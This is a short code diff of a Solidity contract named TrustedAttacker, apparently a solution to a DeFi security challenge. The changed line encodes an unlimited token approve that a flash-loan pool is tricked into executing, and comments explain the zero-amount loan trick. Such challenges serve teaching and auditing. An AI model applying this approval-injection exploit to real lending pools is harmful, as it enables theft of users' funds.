@@ -23,8 +23,8 @@ contract TrustedAttacker {
     function attack() external {
         // Henryk: encode the amount as the max unsigned int to approve which will be
         // executed by the pool. We can just do the amount of the balance but I just did
-        // max for fun
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);
+        // max for fun. Note that type(uint256).max is (2^256)-1. 
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
 
         // Henryk: Taking out a "0" loan so I don't have to have an extra line of code
         // to transfer the flash loan amount back. I only care about the pool executing
